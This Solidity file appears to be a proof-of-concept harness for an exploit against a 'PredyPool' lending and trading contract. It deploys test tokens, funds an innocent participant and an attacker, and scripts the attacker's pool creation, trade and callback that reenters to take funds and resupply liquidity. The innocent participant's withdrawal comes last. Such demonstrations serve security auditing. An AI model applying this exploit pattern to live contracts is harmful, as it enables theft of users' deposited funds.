// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {UniswapV3Factory} from "@uniswap/v3-core/contracts/UniswapV3Factory.sol";
import {WETH9} from "canonical-weth/contracts/WETH9.sol";
import {UniswapV3Factory} from "@uniswap/v3-core/contracts/UniswapV3Factory.sol";
import {NonfungibleTokenPositionDescriptor} from "@uniswap/v3-periphery/contracts/NonfungibleTokenPositionDescriptor.sol";
import {INonfungibleTokenPositionDescriptor} from "@uniswap/v3-periphery/contracts/interfaces/INonfungibleTokenPositionDescriptor.sol";

import {NonfungiblePositionManager} from "@uniswap/v3-periphery/contracts/NonfungiblePositionManager.sol";
import {INonfungiblePositionManager} from "@uniswap/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import {IHooks} from "src/interfaces/IHooks.sol";
import {IPredyPool} from "src/interfaces/IPredyPool.sol";

import {__Yult__Toolbox, YultLib} from "Yult.sol";
import {AERC20} from "AERC20.sol";
import {PredyParticipant} from "PredyParticipant.sol";

// To check the supply balance in PredyPool.
import {ISupplyToken} from "src/interfaces/ISupplyToken.sol";



contract TokenA is AERC20 {
  constructor() AERC20("TokenA", "TKA") {
    _mint(msg.sender, 1000 * (10 ** decimals()));
  }
}
contract TokenB is AERC20 {
  constructor() AERC20("TokenB", "TKB") {
    _mint(msg.sender, 1000 * (10 ** decimals()));
  }
}

contract Deployer {
  constructor() payable {

      WETH9 weth     = new WETH9();
      AERC20 tokenA = AERC20(new TokenA());
      AERC20 tokenB   = AERC20(new TokenB());
      __Yult__Toolbox toolbox = new __Yult__Toolbox(weth, tokenA, tokenB);

      uint moveAmount = 10;
      uint24 fee1 = 3000;
      uint24 fee2 = 10000;

      // Create Participant Contracts
      PredyParticipant participant1 = new PredyParticipant(tokenA, tokenB, fee1, toolbox);
      PredyParticipant participant2 = new PredyParticipant(tokenA, tokenB, fee2, toolbox);
      // Give tokens to participants
      tokenA.transfer(address(participant1), 1 + moveAmount * (10 ** tokenA.decimals()));
      tokenB.transfer(address(participant1), 1 + moveAmount * (10 ** tokenB.decimals()));
      tokenA.transfer(address(participant2), 1);
      tokenB.transfer(address(participant2), 1);
      
      participant1.createPredyPool();
      participant1.supplyLiquidity(true);
      participant1.supplyLiquidity(false);

      // Attacker's hack
      participant2.createPredyPool();
      participant2.trade();

      // Attacker withdraws the amounts put in
      participant2.withdrawLiquidity(true);
      participant2.withdrawLiquidity(false);

      // Innocent tries legitimate withdrawal.
      participant1.withdrawLiquidity(true);
      participant1.withdrawLiquidity(false);

    }

  function predySettlementCallback(
    address /*quoteToken*/,
    address /*baseToken*/,
    bytes memory /*settlementData*/,
    int256 /*baseAmountDelta*/
  ) external {
  }


  function predyTradeAfterCallback(
    IPredyPool.TradeParams memory /*tradeParams*/,
    IPredyPool.TradeResult memory /*tradeResult*/
  ) external {
    PredyParticipant(msg.sender).take(true);
    PredyParticipant(msg.sender).take(false);
    PredyParticipant(msg.sender).supplyLiquidity(true);
    PredyParticipant(msg.sender).supplyLiquidity(false);
  }
}

